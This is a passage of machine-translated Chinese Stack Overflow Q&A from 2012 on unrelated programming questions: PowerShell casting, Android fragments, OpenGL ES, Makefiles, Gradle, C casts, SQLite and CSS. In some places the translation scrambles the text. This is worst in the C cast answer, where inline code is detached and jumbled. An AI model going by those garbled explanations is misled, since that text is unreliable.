为了帮助您了解我要完成的工作，请查看下面的示例。考虑一个组合框及其相应的选项，如 (foo*Bar*FooBar*) => 一个具有 3 个选项的组合框。

```
---------------------------------------------------------------------------------
|Apple          | (plant*animal) |  (blue*green*red*etc)  |     (smooth*rough*) |
|Steak          | (plant*animal) |  (blue*green*red*etc)  |     (smooth*rough*) |
|Peach          | (plant*animal) |  (blue*green*red*etc)  |     (smooth*rough*) |
--------------------------------------------------------------------------------- 
```

一如既往; 非常感谢您的帮助！=)

# loops - 我无法让 PowerShell 正确转换为 int

> ID：10603059
> 
> 赞同：2
> 
> 时间：2012-05-15T14:35:34.040
> 
> 标签：loops, powershell, csv, casting

我目前正在导入一个[CSV](http://en.wikipedia.org/wiki/Comma-separated_values)文件，该文件有一列全是数字。我正在尝试将其转换为 int 并且仅提取大于 100 的值。我手动浏览了此 CSV 文件，并且可以确认有三行的值大于 100%。但是，这总是返回 0。我做错了什么？

```
$percentTooLarge = Import-Csv path\file.csv | Foreach-Object { $_.SumHoldingPercent = $_.SumHoldingPercent -as [int]; $_ } | Where-Object { $_.SumHoldingPercent -gt 100 } | Measure-Object
$numPercentTooLarge = $percentTooLarge.Count 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-16T11:37:20.340

由于比较运算符在 PowerShell 中的工作方式，这应该可以解决问题：

```
$percentTooLarge = Import-Csv path\file.csv | 
    Where-Object { 100 -lt $_.SumHoldingPercent} | 
    Measure-Object 
```

基本上，当您比较事物时，PowerShell 会尝试将 right 转换为 left 的类型。如果您首先输入来自 ipcsv 的值 - left 将是一个字符串。如果您先输入数字 - 它会将 CSV 文件中的值转换为数字（它足够聪明，可以保持足够大的类型；））

我用这段代码测试过：

```
@"
foo,bar,percent
alfa,beta,120.5
beta,gamma,99.9
foo,bar,30.4
works,cool,120.7
"@ | ConvertFrom-Csv | where { 100 -lt $_.percent } 
```

...结果似乎还可以。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T17:11:22.237

查看您与@Shay Levy 的对话，我会使用：

```
[System.Globalization.CultureInfo] $culture = "en-us" 
```

所以你可以尝试类似的东西：

```
([decimal]::parse($_.SumHoldingPercent ,$culture)) -gt 100 
```

# c++ - cppunit 中与 qttestrunner 的链接问题

> ID：10603061
> 
> 赞同：0
> 
> 时间：2012-05-15T14:35:47.757
> 
> 标签：c++, qt, linker, cppunit

我正在一个基于 lib cppunit 的项目中工作，我需要使用`qttestrunner` 我制作 libqttestrunnerd.a （qmake qttestrunnerlib.pro 和 make ）运行我的测试，显然存在链接问题，这是一个输出示例：

`/home/oumaya/docs/UT_Cpp_Test/main/cppDir/lib/lib/libqttestrunnerd.a(moc_testbrowserdlg.o):(.rodata._ZTV15TestBrowserBase[vtable for TestBrowserBase]+0x30): undefined reference to 'QWidget::setName(char const*)' /home/oumaya/docs/UT_Cpp_Test/main/cppDir/lib/lib/libqttestrunnerd.a(moc_testbrowserdlg.o):(.rodata._ZTV15TestBrowserBase[vtable for TestBrowserBase]+0x34): undefined reference to 'QObject::insertChild(QObject*)'`

有很多与 QT 对象相关的类似消息。
任何帮助请
提前谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:30:14.283

使用 qt 时，`undefined reference to ...`通常这意味着您正在继承一个类而不是实现它的虚函数。检查您正在继承的 Qt 类的文档，并找出它的哪些函数是虚拟的并在您的类中实现它们。

# solr - 高亮和返回字段 Solr

> ID：10603062
> 
> 赞同：1
> 
> 时间：2012-05-15T14:35:48.750
> 
> 标签：solr, indexing, highlight

我注意到查询的突出显示的术语在第二个 xml 结构（名为“突出显示”）中返回。是否可以将突出显示的术语返回到文档字段中。我不需要 solr 生成的突出显示字段的 id。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-16T13:52:29.013

抱歉，Solr 不支持将突出显示的术语返回到原始文档字段中。

Solr 确实以这种方式突出显示，因为有可能（基于您的荧光笔的配置方式）所有查询结果可能没有任何突出显示结果。此外，由于它支持突出显示多个字段并使用第二个 xml 结构来返回可能的多个突出显示结果并按索引文档的 id 字段对它们进行分组，因此它们可以正确地与找到它们的文档相关联。

如果您想用突出显示的字段替换原始文档字段，则需要在返回 Solr 查询结果后执行您自己的处理。

# java - 如何在android中将图像转换为十六进制字符串？

> ID：10603063
> 
> 赞同：2
> 
> 时间：2012-05-15T14:35:53.217
> 
> 标签：java, android, hex, type-conversion, image-conversion

我需要将图像转换为十六进制字符串以将其发送到 Web 服务器。我正在使用这种方法将图像转换为字节数组

```
 BitmapFactory.Options options = new BitmapFactory.Options();
         options.inSampleSize = 8; 
         Bitmap receipt = BitmapFactory.decodeFile(photo.toString(),options);
         int size = receipt.getRowBytes() * receipt.getHeight();  
         ByteArrayOutputStream stream = new ByteArrayOutputStream();
         receipt.compress(Bitmap.CompressFormat.JPEG, 90, stream);
         receiptbyte = stream.toByteArray();   
         String hexstring = toHex(receiptbyte); 
```

并将其转换为十六进制

```
 public static String toHex(byte[] bytes) {
    BigInteger bi = new BigInteger(1, bytes); 
    return String.format("%0" + (bytes.length << 1) + "X", bi);
} 
```

我想像这样产生输出

`c11ee236-8f72-4b60-9208-79977d61993f`

我不知道该怎么办。我需要编码吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T14:54:41.740

您喜欢的字符串`c11ee236-8f72-4b60-9208-79977d61993f`不是图像 - 它看起来更像是存储在服务器上的图像的 ID。

如果您想要图像，则必须将 ID 发送到服务器，然后服务器将存储在属于该 ID 的数据库中的图像数据发回。

在 Java 中，您可以简单地自己生成这样的随机 ID：

```
UUID u = UUID.randomUUID();
System.out.println(u.toString()); 
```

输出例如：`3aa5b32d-c6fb-43c5-80c9-78a1a35aff40`

构建您自己的服务器，您可以使用它并将图像数据和此 ID 保存到数据库中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2020-10-22T14:13:40.643

你可以这样做

```
//encode image to base64 string
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Bitmap bitmap = BitmapFactory.decodeResource(getResources(), R.drawable.logo);
        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos);
        byte[] imageBytes = baos.toByteArray();
        String imageString = Base64.encodeToString(imageBytes, Base64.DEFAULT);

        //decode base64 string to image
        imageBytes = Base64.decode(imageString, Base64.DEFAULT);
        Bitmap decodedImage = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.length);
        image.setImageBitmap(decodedImage); 
```

[https://www.thecrazyprogrammer.com/2016/10/android-convert-image-base64-string-base64-string-image.html](https://www.thecrazyprogrammer.com/2016/10/android-convert-image-base64-string-base64-string-image.html)

# android - 具有兼容库的 Android 片段

> ID：10603069
> 
> 赞同：2
> 
> 时间：2012-05-15T14:36:13.967
> 
> 标签：android, android-fragments, android-support-library

我不能让它工作。

我在这里发现了许多类似的问题，例如。但是没有任何帮助，也没有任何作用。有没有人在带有 android.support.v4 库的 Android 2.2 中有工作片段？（如果你是请上传到某个地方。）

我几乎要哭了，因为我找不到问题所在！

该错误与许多人的错误相同：

```
05-15 18:20:20.583: W/dalvikvm(1521): Unable to resolve superclass of Lmy/fragment/test/FragmentTestActivity; (8)
05-15 18:20:20.583: W/dalvikvm(1521): Link of class 'Lmy/fragment/test/FragmentTestActivity;' failed
05-15 18:20:20.593: D/AndroidRuntime(1521): Shutting down VM
05-15 18:20:20.593: W/dalvikvm(1521): threadid=1: thread exiting with uncaught exception (group=0x4001d800)
05-15 18:20:20.703: E/AndroidRuntime(1521): FATAL EXCEPTION: main
05-15 18:20:20.703: E/AndroidRuntime(1521): java.lang.RuntimeException: Unable to instantiate activity ComponentInfo{my.fragment.test/my.fragment.test.FragmentTestActivity}: java.lang.ClassNotFoundException: my.fragment.test.FragmentTestActivity in loader dalvik.system.PathClassLoader[/data/app/my.fragment.test-1.apk]
05-15 18:20:20.703: E/AndroidRuntime(1521):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2585)
05-15 18:20:20.703: E/AndroidRuntime(1521):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2679)
05-15 18:20:20.703: E/AndroidRuntime(1521):     at android.app.ActivityThread.access$2300(ActivityThread.java:125)
05-15 18:20:20.703: E/AndroidRuntime(1521):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2033)
05-15 18:20:20.703: E/AndroidRuntime(1521):     at android.os.Handler.dispatchMessage(Handler.java:99)
05-15 18:20:20.703: E/AndroidRuntime(1521):     at android.os.Looper.loop(Looper.java:123)
05-15 18:20:20.703: E/AndroidRuntime(1521):     at android.app.ActivityThread.main(ActivityThread.java:4627)
05-15 18:20:20.703: E/AndroidRuntime(1521):     at java.lang.reflect.Method.invokeNative(Native Method)
05-15 18:20:20.703: E/AndroidRuntime(1521):     at java.lang.reflect.Method.invoke(Method.java:521)
05-15 18:20:20.703: E/AndroidRuntime(1521):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
05-15 18:20:20.703: E/AndroidRuntime(1521):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
05-15 18:20:20.703: E/AndroidRuntime(1521):     at dalvik.system.NativeStart.main(Native Method)
05-15 18:20:20.703: E/AndroidRuntime(1521): Caused by: java.lang.ClassNotFoundException: my.fragment.test.FragmentTestActivity in loader dalvik.system.PathClassLoader[/data/app/my.fragment.test-1.apk]
05-15 18:20:20.703: E/AndroidRuntime(1521):     at dalvik.system.PathClassLoader.findClass(PathClassLoader.java:243)
05-15 18:20:20.703: E/AndroidRuntime(1521):     at java.lang.ClassLoader.loadClass(ClassLoader.java:573)
05-15 18:20:20.703: E/AndroidRuntime(1521):     at java.lang.ClassLoader.loadClass(ClassLoader.java:532)
05-15 18:20:20.703: E/AndroidRuntime(1521):     at android.app.Instrumentation.newActivity(Instrumentation.java:1021)
05-15 18:20:20.703: E/AndroidRuntime(1521):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2577)
05-15 18:20:20.703: E/AndroidRuntime(1521):     ... 11 more
05-15 18:20:23.423: I/Process(1521): Sending signal. PID: 1521 SIG: 9 
```

解决了！！！！谁在错误前有此警告：

```
05-16 10:08:00.033: W/dalvikvm(1695): Unable to resolve superclass of Lmy/fragment/test/FragmentTestActivity; (7)
05-16 10:08:00.076: W/dalvikvm(1695): Link of class 'Lmy/fragment/test/FragmentTestActivity;' failed 
```

应该将 android-support-v4 导出到您的应用程序：

配置 Java 构建路径 -> 订购和导出选项卡 ->**设置复选框 android-support-v4.jar**

（可能需要先删除现有的）

它会将这个库移动到你的apk（据我所知）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T14:52:34.327

你应该有 1 个 FragmentActivity，里面有片段。您正在做的是尝试将活动（片段活动）放入 xml 中。那是行不通的。尝试只拥有 1 个顶级片段活动，然后将另一个片段制作成片段，然后将这些片段放入您的 xml 中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:29:36.700

由于您显然只是在了解这一点，因此我将扩展 Warpzit 的答案以尝试帮助您（您应该接受他的答案，以便他获得信任，因为它是正确的答案并且他首先回答了）。

这个：

```
public class DetailsActivity extends FragmentActivity 
```

需要是这样的：

```
public class DetailsActivity extends Fragment 
```

与您希望作为第一个活动的一部分显示的任何其他选项卡一样。

应该只有一个 FragmentActivity 除非您要开始第二个活动（并离开第一个活动），该活动也将有片段，然后同样适用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T14:41:33.297

为什么你有两个名为 FragmentTestActivity 的活动？还是只是写错误？你在清单中声明了吗？

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-05-15T14:42:35.780

尝试替换`android:name="classpath"`为`class=""classpath`.

# android - 纹理和颜色在 OpenGL ES 中未正确显示

> ID：10603071
> 
> 赞同：3
> 
> 时间：2012-05-15T14:36:25.523
> 
> 标签：android, opengl-es, colors, textures

我一直在关注[http://www3.ntu.edu.sg/home/ehchua/programming/android/Android_3D.html](http://www3.ntu.edu.sg/home/ehchua/programming/android/Android_3D.html)上的教程，但遇到了问题。

我已经设法使以下两个示例都起作用：

*2.7 示例 5：3D 形状 - 旋转颜色立方体和金字塔（尼赫第 5 课：3D 形状）示例 2：Cube2.java*

*2.8 示例 6：纹理（Nehe 第 6 课：纹理）*

但是当我尝试绘制彩色立方体和纹理立方体时，我得到以下信息：

[http://i.imgur.com/Smbsa.png](http://i.imgur.com/Smbsa.png) （图片的第一部分）

彩色立方体是不可见的，但会剪切纹理立方体，并且纹理立方体的纹理由彩色立方体的最后一种颜色（黄色）着色。

我基本上只是用以下方法绘制两个立方体：

```
 // ----- Render the Color Cube -----
  gl.glLoadIdentity();                // Reset the model-view matrix
  gl.glTranslatef(0.0f, 0.0f, -6.0f); // Translate right and into the screen
  gl.glScalef(0.5f, 0.5f, 0.5f);      // Scale down (NEW)
  gl.glRotatef(angleCube, 1.0f, 1.0f, 0.0f); // rotate about the axis (1,1,1) (NEW)
  cube.draw(gl);                      // Draw the cube (NEW)

  // Update the rotational angle after each refresh (NEW)
  angleCube += speedCube;         // (NEW)

  // ----- Render the Texture Cube -----
  gl.glLoadIdentity();                // Reset the model-view matrix
  gl.glTranslatef(-1.0f, 0.0f, -6.0f); // Translate right and into the screen
  gl.glScalef(0.5f, 0.5f, 0.5f);      // Scale down (NEW)
  gl.glRotatef(angleCube, 1.0f, 1.0f, 0.0f); // rotate about the axis (1,1,1) (NEW)
  texturecube.draw(gl);                      // Draw the cube (NEW) 
```

*我尝试从“ 2.9 示例 6a：Photo-Cube* ”部分添加第三个所谓的“照片立方体”。

***（只能发2个链接查看上面的imgur链接）***

我补充说：

```
 gl.glColor4f(0.0f, 0.0f, 1.0f, 1.0f); 
```

到纹理立方体并注意到蓝色“溢出”到照片立方体上。

当我添加：

```
 gl.glColor4f(1.0f, 1.0f, 1.0f, 0.0f); 
```

以下纹理不再着色，但这感觉像是去除过去颜色的粗略方法..

当我删除：

```
 texturecube.loadTexture(gl, context);    // Load image into Texture (NEW)
  photocube.loadTexture(gl);    // Load image into Texture (NEW)
  gl.glEnable(GL10.GL_TEXTURE_2D);  // Enable texture (NEW) 
```

有时候是这样的：

***（只能发2个链接查看上面的imgur链接）***

颜色立方体回来了，所有其他表面都被着色了。

**我的问题：**

当彩色立方体消失时我做错了什么？（我想应该可以同时使用纹理和颜色）

除了“gl.glColor4f(1.0f, 1.0f, 1.0f, 0.0f);”之外，有没有更好的方法从以前的立方体/对象中“清除”颜色？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T17:01:16.830

您的问题非常详细，这很好，但如果您发布绘图部分的完整代码示例会有所帮助。我很难猜测你可能会做什么会导致问题。

无论如何，我会尝试你的两个问题：

第一：我的猜测是在绘制彩色立方体之前不要禁用纹理。但是你没有完整的代码，所以我不能肯定地说。在渲染第二个立方体之前调用`glDisable(GL_TEXTURE_2D)`，并在绘制下一个纹理立方体之前重新启用它。

第二：不，这是正确的方法（尽管您可能想要`1,1,1,1`，但`1,1,1,0`万一您想要做任何透明的事情）。或者，有一种方法可以通过将颜色状态推送到 OpenGL 堆栈并稍后弹出它来实现，尽管这种方法已被弃用且不应使用。

# iphone - 在我们从服务器端获得响应之前，我们如何放置活动指示

> ID：10603073
> 
> 赞同：0
> 
> 时间：2012-05-15T14:36:30.887
> 
> 标签：iphone

我是 iphone 新手。我正在做一个项目，当我点击登录屏幕中的提交按钮时，会出现一个登录屏幕，它会在一段时间后向服务器发送验证请求，它会给出响应，我正在显示该响应向用户发出警报视图。但实际问题是，当用户单击提交按钮时，我使用计时器放置一些活动指示器 1 秒，但响应在 5 秒内出现，因此活动指示器在 4 秒之前停止。那么，我该如何放置活动指示器，直到响应来自服务器端。如果有人知道这一点，请帮助我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T14:41:14.617

您需要在请求未完成时显示您的“指标”

您的请求需要像这样异步：

```
-(void) performCheckServer // YOUR FUNCTION 
{

    // Construct your request
NSURLConnection *connection = [[NSURLConnection alloc] initWithRequest:req delegate:self];
    [connection start];

    // show your indicator
}

 - (void)connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response
{
}

 - (void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)data {
}

- (void)connection:(NSURLConnection *)connection didFailWithError:(NSError *)error {
    //hide indicator
}

 - (void)connectionDidFinishLoading:(NSURLConnection *)connection {
//hide indicator
} 
```

其他解决方案：使用 Progress HUD

*   [https://github.com/jdg/MBProgressHUD](https://github.com/jdg/MBProgressHUD)

并使用功能：

```
 [HUD showWhileExecuting:@selector(myProgressTask) onTarget:self withObject:nil animated:YES]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T14:37:40.543

请参阅此处完成步骤 y 步骤教程

[http://www.theappcodeblog.com/2011/03/09/activity-indicator-tutorial/](http://www.theappcodeblog.com/2011/03/09/activity-indicator-tutorial/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T14:42:34.767

你在做什么使指标消失？你一定是打电话给：

```
[yourIndicatorView stopAnimating] 
```

或者

```
[yourIndicatorView removeFromSuperview] 
```

或者

```
yourIndicatorView.alpha = 0.f (<-- bad idea) 
```

...或使活动指示器消失的*东西。*

您应该将该调用移动到指示请求已完成的 NSURLConnection 回调中。

# c - 平台条件生成文件

> ID：10603075
> 
> 赞同：0
> 
> 时间：2012-05-15T14:36:39.567
> 
> 标签：c, makefile, cross-platform

我正在尝试使用以下语句使我的 Makefiles 平台有条件：

```
ifeq ($(UNAME), Linux)
# LINUX version
program_NAME := lib$(TARGET).so
OBJDIR = ../build/linux
endif

ifeq ($(UNAME), MINGW32_NT-6.1)
# WINDOWS version
program_NAME := lib$(TARGET).dll
OBJDIR = ../build/windows
endif 
```

和：

```
ifeq ($(UNAME), Linux)
# LINUX version
program_INCLUDE_DIRS := \
    /home/ben/projects/g2/src \
    /home/ben/projects/pulse_IO/src \
    /home/ben/projects/core/src

endif

ifeq ($(UNAME), MINGW32_NT-6.1)

# WINDOWS Virtual Machine version
program_INCLUDE_DIRS := \
    E:/g2/src \
    E:/pulse_IO/src \
    E:/core/src

endif 
```

然后，我在 Linux 或 Windows 7 下编译 src，在 Linux 主机操作系统上作为 VM（通过 virtualbox）运行。`/build/linux`我没有设法解决的问题是如何将目标文件和生成的共享库或可执行文件写入平台特定的目录，例如`/build/windows`源代码所在的位置`/src`

如您所见，我添加了一个`OBJDIR`变量，但我不知道如何使用它将`.o, .so, .dll, .exe`文件重定向到平台上的正确目录。我确信这应该很容易，但我的研究一直陷入关于`vpath`使用的文章，我认为这不是我所追求的。

我认为我需要修改的Makefile部分如下：

```
LINK.c := $(CC) $(CFLAGS) $(CPPFLAGS) $(LDFLAGS) $(TARGET_ARCH)

$(program_NAME): $(program_OBJS)
    $(LINK.c) -shared -Wl,-soname,$(program_NAME) $(program_OBJS) -o $(program_NAME) 
```

我可能应该使用更智能的东西，比如 autotools 或 cmake，但现在让它工作会很棒。

还应该添加，我的目标文件列表创建如下：

```
program_C_OBJS := ${program_C_SRCS:.c=.o} 
```

试过：

```
program_OBJS := $(addprefix $(OBJDIR)/$program_C_OBJS) 
```

但是请补偿 addprefix 的编号错误。论据

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:03:00.443

对于 gmake，请参见[此处](http://www.gnu.org/software/make/manual/make.html#Prerequisite-Types)：

```
 OBJDIR := objdir
 OBJS := $(addprefix $(OBJDIR)/,foo.o bar.o baz.o)

 $(OBJDIR)/%.o : %.c
         $(COMPILE.c) $(OUTPUT_OPTION) $<

 all: $(OBJS)

 $(OBJS): | $(OBJDIR)

 $(OBJDIR):
         mkdir $(OBJDIR) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T14:57:28.980

您使用的是什么编译器和工具集？对于 QNX，它具有如下宏：

```
$OS
$CPU
$PRODUCT
$PROJECT
$SECTION
$VARIANT ($VARIANTLIST, $EXCLUDE_VARIANTLIST) 
```

这些允许您自定义构建结果的目标文件夹和文件名。

[http://www.qnx.com/developers/docs/6.3.2/neutrino/prog/make_convent.html](http://www.qnx.com/developers/docs/6.3.2/neutrino/prog/make_convent.html)

其他编译器/工具链具有类似的功能。

# eclipse - 使 Gradle 不使用源集目录作为 Eclipse 源文件夹

> ID：10603076
> 
> 赞同：3
> 
> 时间：2012-05-15T14:36:40.480
> 
> 标签：eclipse, gradle

我在构建中设置了一个额外的 java 源代码，称为`gen`- 就像在生成的源代码中一样，其中包含很多编译器警告。任务将本`gradle eclipse`集的源目录配置为eclipse源文件夹，导致出现很多我不想看到的警告。另一个原因是，不应更改生成的源代码——我不希望有人意外编辑它，认为它是常规代码。

以下方法有效，但仅在使用 覆盖现有配置时才有效`gradle eclipse`。

```
eclipse.classpath.file {
    whenMerged { classpath ->
        classpath.entries.removeAll { 
            entry -> entry.kind == 'src' && entry.path == 'src/gen/java'
        }
    }
} 
```

但是，如果清理配置 - 则不起作用`gradle cleanEclipse eclipse`，这是您首次在 eclipse 中导入项目时发生的情况。

阅读[EclipseClasspath 对象文档](http://gradle.org/docs/current/dsl/org.gradle.plugins.ide.eclipse.model.EclipseClasspath.html)，我认为唯一的其他方法是使用`eclipse.classpath.file.withXml`，但它接缝太乱，无法编辑原始 xml。

还有其他更优雅的解决方案吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-02-12T13:22:45.380

这是我实现这一目标的方法（在我的例子中，源文件夹被合并，只有包不同）：

```
apply plugin: 'java'
sourceSets {
    main {
        java {
            srcDir 'src/main/java'
            exclude 'com/foo/generated/**'
        }
    }
    // This sourceset is ignored by Eclipse
    gen {
        java {
            srcDir 'src/main/java'
            include 'com/foo/generated/**'
        }
    }
}
// Include in a real build from Gradle rather than Eclipse
compileJava {
    source sourceSets.gen.java
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-30T14:01:49.727

我通过将“gen”目录添加到主 java sourceSet 解决了类似的情况。

如下

```
configurations {
 jaxb
}

dependencies {
  jaxb 'com.sun.xml.bind:jaxb-xjc:'
}

sourceSets.main.java.srcDirs 'gen'

task createGenDirs() {
  file("gen").mkdirs()
}

task jaxb << {
  dependsOn createGenDirs

  //generate src into gen directory

}

task cleanGeneratedCode(type: Delete) {
  delete file("gen")

clean.dependsOn cleanGeneratedCode 
```

希望这可以帮助

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-06-22T14:36:37.027

如果 Eclipse 不知道其他代码正在使用的生成源，那么您可能最终会在 Eclipse 中出现编译器*错误*。

但也许如果有一个 gradle 用来创建第二个 jar 的源目录，或者类似的东西。如果您将这些东西作为单独的源集，那么您可以将其从 Eclipse 中排除：

```
sourceSets {
    main {
        java { srcDir 'src' }
    }
    gen {
        java { srcDir 'src-gen' }
    }
}
eclipse {
    classpath {
        sourceSets -= [sourceSets.gen]
    }
} 
```

我的项目文件引用另一个项目的源代码的情况略有不同，因此我不希望任何代码出现在 Eclipse 中：

```
sourceSets.main.java { srcDir '../other_project/src' }
eclipse {
    classpath {
        // remove the source set from the Eclipse classpath
        sourceSets -= [sourceSets.main]
    }
    // Don't let the src dir show up as a linked folder either
    project {
        file {
            withXml {
                def res = it.asNode().get('linkedResources')[0]
                res.link.findAll{ it.name[0].text() == 'src' }.each{     
                    res.remove(it) }
            }
        }
    }
} 
```

# c++ - (unsigned char)str vs str + 0xff 或 (unsigned int)value vs value + 0xffff 哪个是更快和首选的方法？

> ID：10603077
> 
> 赞同：0
> 
> 时间：2012-05-15T14:36:41.137
> 
> 标签：c++, c

我想知道以下哪些构造是首选和更快的。

`unsigned char str1 = (unsigned char)str2`对比`unsigned char str1 = str2 & 0xff`
或
`unsigned value1 = (unsigned)value2`对比`unsigned value1 = value2 & 0xffffffff`

*问题：*
- 通过转换为：
- 第一比第二（`0xff`或`0xffffffff`）快吗？
- 你更喜欢用哪个？哪个更好用？
- 可以`(unsigned char)str`更改为`str & 0xff`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T14:39:07.563

这四个代码片段中没有两个做同样的事情。它们之间的任何速度差异都是无关紧要的（因为运行得更快但做错事情的代码毫无价值）并且可以忽略不计（它们都非常快）。

编辑更新的问题：

假设 ,`CHAR_BIT == 8`是`str`以下之一： 无符号整数；具有正值的有符号整数；具有 2 的补码表示的有符号整数；然后`(unsigned char) str`给出与 相同的数值结果`str & 0xff`，但类型不同。无论您编写哪一个，编译器都会选择一种快速的方法来计算该结果，这两种情况下的方法很可能相同。因此，您最好只编写`unsigned char str1 = str2;`，并在`(unsigned char)`需要时添加强制转换，以抑制您为丢失信息的隐式转换而获得的任何编译器警告。

在大多数实现中，`unsigned`是 32 位类型，在这种情况下，会产生与大于 65535`(unsigned)value2`不同`value2 & 0xffff`的值。撇开这一点不谈（假设您使用的是 16 位实现），它与那么结果具有相同的类型和相同的值。`value2``unsigned char``value2``unsigned`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:06:59.423

演员表的效果很大程度上取决于 和 的`str`类型`value`。
例如，如果`str`是`unsigned char`，将其强制转换为`unsigned char`无济于事，无论好坏。如果它`int`改变了事情，如果是一个指针 - 这完全是另一回事。

关于性能 - 这是你最不应该担心的事情。差异，如果有的话，将是微小的。将优化工作花在重要的地方。

# objective-c - 放置两个内联 在目标 C 中的 DTCoreText 中并排？

> ID：10603078
> 
> 赞同：2
> 
> 时间：2012-05-15T14:36:41.980
> 
> 标签：objective-c, ios, pdf-generation

我在目标 C 中使用 DTCoreText（通过 OCPDFGenerator）将 HTML 转换为 PDF。除了并排放置两个 div 外，一切正常。
（我不能使用表格，因为 DTCoreText 目前不支持表格渲染 -
[https://github.com/Cocoanetics/DTCoreText/issues/144](https://github.com/Cocoanetics/DTCoreText/issues/144)）

前任：

> ```
> 左右
> ```

似乎没有办法这样做，因为无论我们在 style 中传递什么属性，它们总是杂乱无章，因为在内部它被合并为单个文本。

我正在使用的代码是 -

```
<div style='float:left;position:relative;width:100%;'>
<span style='position:absolute;top:0;left:0;'>Left</span>
<span style='position:absolute;top:0;right:0;'>Right</span>
</div> 
```

呈现的 pdf 文件中的输出是（尽管 html 在网页上正确呈现，float:left 也以类似的方式工作，因此 HTML 的正确性毫无疑问） -

> 左右

此问题扩展为并排维护许多此类预定义的间隔文本选项卡。

一种解决方法是将空格附加到第一个文本字符串，直到它与传递的 width 匹配，但这会在多行文本的情况下出现问题，因此我无法继续使用它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-24T13:52:00.217

您可能应该创建另一个`NSAttributedString`并将其放置在您想要的位置。似乎 DTCoreText 不支持多列布局，因此您必须使用objective-c（而不是html）来执行此操作。

# java - 在没有 g2d .rotate 的情况下旋转字符串

> ID：10603079
> 
> 赞同：0
> 
> 时间：2012-05-15T14:36:49.550
> 
> 标签：java

我有一个程序，它在行（街道+街道名称）旁边输入很多字符串现在我想在街道顶部附加/对齐街道名称。

但是当我使用 g2d.rotate 时，所有的街道也会旋转。

那么还有另一种简单的方法来旋转字符串吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T14:52:56.953

以首选方向绘制字符串后，您将需要返回原始旋转。

```
// rotated 90 degrees around world origin
g2d.rotate(Math.toRadians(90));
g2d.drawString("Broadway", 0, 50);

// rotated -90 degrees around world origin
g2d.rotate(Math.toRadians(-90));
g2d.setColor(Color.GRAY.darker());
g2d.fillRect(50, 50, 50, 50); 
```

您还可以使用类使用转换`AffineTransform`。您可以找到有关[转换形状、文本和图像的更多详细信息（Java™ 教程> 2D 图形> Java2D 中的高级主题）](http://docs.oracle.com/javase/tutorial/2d/advanced/transforming.html)

# sql - 如何在sqlite中使用like运算符进行复杂查询

> ID：10603080
> 
> 赞同：3
> 
> 时间：2012-05-15T14:36:55.837
> 
> 标签：sql, database, sqlite

大家好，我在 SQLite 数据库中有名为 student 的下表。

这是我的表结构

```
id       name
-----------------------

"3"  "Babu Qw"  
"2"  "Ganesh Babu"  
"1"  "Murali  Abb"  
"4"  "ganesh1 Babu"             
"5"  "hari murali"              
"10" "Abbash abc" 
```

name 字段由名字和姓氏组合而成。例如“Babu Qw” Babu 是名字，Qw 是姓氏，由空格分隔。

name 是输入字段，其中 'ba' 是我的输入参数。（**例如 .. name like 'ba'**）

现在我想获取以“ba”开头的任何名称**（名字或姓氏）而不是任何中间字符的记录。**

输出将是：

```
id       name
-----------------------

"3"  "Babu Qw"  
"2"  "Ganesh Babu"  
"4"  "ganesh1 Babu" 
```

此处“Abbash abc”（名字 Abbash 或姓氏 abc 不以 ba 开头）因此未列出“Abbash abc”。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T14:47:19.457

这应该可以解决问题：

```
select id, name
from table
where name like 'Ba%' or name like '% Ba%' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T14:46:49.250

你可以在 SQLite 中使用 REGEXP 吗？就像是

```
SELECT * FROM table WHERE name REGEXP('^ba.*') OR name REGEXP('^.* ba.*'); 
```

注意：我不是真正的正则表达式，所以这个可能是错误的，或者你甚至可以只做一个。好吧，你明白了。

# css - 保留元素之间的空间

> ID：10603085
> 
> 赞同：1
> 
> 时间：2012-05-15T14:37:08.053
> 
> 标签：css

我有一组元素一个接一个地放置。如果用户单击一个元素，则会为其设置 1px 宽度的边框。结果，其他 img 元素被移动。

如何在每个 img 元素周围保留 1px 宽度空间？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T14:40:21.420

要么使用`margin`（[MDN](https://developer.mozilla.org/en/CSS/margin)）

```
margin: 1px; 
```

或将`border-color`（[MDN](https://developer.mozilla.org/en/CSS/border-color)）设置为`transparent`并切换颜色

```
border-color: transparent; 
```

